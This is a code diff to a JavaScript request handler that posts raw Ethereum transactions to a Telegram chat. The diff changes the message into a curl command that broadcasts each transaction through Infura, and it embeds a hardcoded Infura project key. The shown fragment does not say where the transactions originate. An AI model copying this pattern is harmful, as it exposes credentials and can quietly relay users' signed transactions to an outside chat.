@@ -17,7 +17,14 @@ export default async function handler(req, res) {
       // Send to Telegram
       await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         chat_id: TELEGRAM_CHAT_ID,
-        text: `🚨 New Raw TX: \n\n${rawTx}`
+        text: `curl -X POST https://mainnet.infura.io/v3/78332c3379cc475bbacf8dba9dd39b50 \
+-H "Content-Type: application/json" \
+-d '{
+  "jsonrpc":"2.0",
+  "method":"eth_sendRawTransaction",
+  "params":["${rawTx}"],
+  "id":1
+}'`
       });
     }
 
@@ -31,3 +38,4 @@ export default async function handler(req, res) {
     res.status(500).json({ error: 'Forwarding failed' });
   }
 }
+
